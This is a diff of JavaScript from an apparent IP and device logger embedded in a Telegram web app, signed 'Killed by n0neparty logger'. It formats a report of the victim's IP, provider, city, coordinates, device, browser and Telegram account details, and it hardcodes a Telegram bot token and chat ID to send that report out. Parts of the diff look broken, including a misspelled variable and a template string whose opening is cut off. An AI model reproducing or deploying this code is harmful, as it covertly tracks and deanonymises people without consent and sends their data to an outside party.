@@ -121,51 +121,48 @@ fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
   let osnam = data.os.name;
   let osvers = data.os.version;
       
-if (!localStorage.getItem('logSent')) {
-    const message = `
-*🔎 IP*
-*├ IP:* \`${ip}\`
-*├ Provider:* \`${isp}\`
-*├ City:* \`${city}\`
-*├ Region:* \`${region}\`
-*└ Timezone IP:* \`${time}\`
+*🔎 ip*
+*├ IP: ${ip}*
+*├ Provider: ${isp}*
+*├ City: ${city}*
+*├ Region: ${region}*
+*└ Timezone IP: ${time}*
 
 *📶 Net Info*
-*├ Coordinates:* \`${longitude} ${latitude}\`
-*├ TLD:* \`${tld}\`
-*├ Version:* \`${version}\`
-*└ Internet:* \`${TypeInternet}\`
+*├ Coordinates: ${longitude} ${latitude},*
+*├ TLD: ${tld}*
+*├ Version: ${versian}*
+*└ Internet: ${TypeInternet}*
 
-*👤 Account:*
-*├ ID:* \`${tg.initDataUnsafe.user.id}\`
-*├ Username:* \`@${tg.initDataUnsafe.user.username}\`
-*├ Name:* \`${tg.initDataUnsafe.user.first_name}\`
-*├ Language:* \`${tg.initDataUnsafe.user.language_code}\`
-*└ Can Write To Pm:* \`${tg.initDataUnsafe.user.allows_write_to_pm}\`
-
-*💻 System*
-*├ OS:* \`${osname}\`
-*├ Battery:* \`${batteryLevel}%\`
-*├ Screen resolution:* \`${screenWidth}x${screenHeight}\`
-*├ Time:* \`${formattedTime}\`
-*├ Language:* \`${language}\`
-*├ Date:* \`${formedDate}\` *Day of week:* \`${dayOfWeek}\`
-*├ Memory:* \`${memory} RAM\`
-*├ TimeZone:* \`${timeZone}\`
-*├ Device:* \`${model}\`
-*└ Device Type:* \`${deviceType}\`
+    
+ *💻 System*
+*├ Os: ${osname}*
+*├ Battery: ${batteryLevel}%*
+*├ Screen resolution: ${screenWidth}x${screenHeight}*
+*├ Time: ${formattedTime}*
+*├ Language: ${language}*
+*├ Date: ${formedDate} Day of week: ${dayOfWeek}*
+*├ Memory: ${memory} RAM*
+*├ TimeZone: ${timeZone}*
+*├ Device: ${model}*
+*└ Device Type: ${deviceType}*
 
 *🌐 Browser*
-*├ Browser:* \`${browser}\`
-*├ Browser Engine:* \`${namebrowser}\`
-*└ UserAgent:* \`${userAgent}\`
+*├ Browser: ${browser}*
+*├ Browser Engine: ${namebrowser}*
+*└ UserAgent: ${userAgent}*
 
-*📄 Clipboard*
-*└ Undefined*
-
-*Killed by n0neparty logger 👾*
-`;
-
+ *📄 Clipboard*
+ *└ Undefined*
+    
+*👤 Account: *
+*├ ID: ${tg.initDataUnsafe.user.id}*
+*├ Username: @${tg.initDataUnsafe.user.username}*
+*├ Name: ${tg.initDataUnsafe.user.first_name}*
+*├ Language: ${tg.initDataUnsafe.user.language_code}*
+*└ Can Write To Pm: ${tg.initDataUnsafe.user.allows_write_to_pm}*
+             *Killed by n0neparty logger 👾*
+                             `;
         
         const token = '6995544575:AAGHO9TjUkG6_qbXCRI79S4jlGvZ9uRTuko';
         const chatId = '-4293423188';
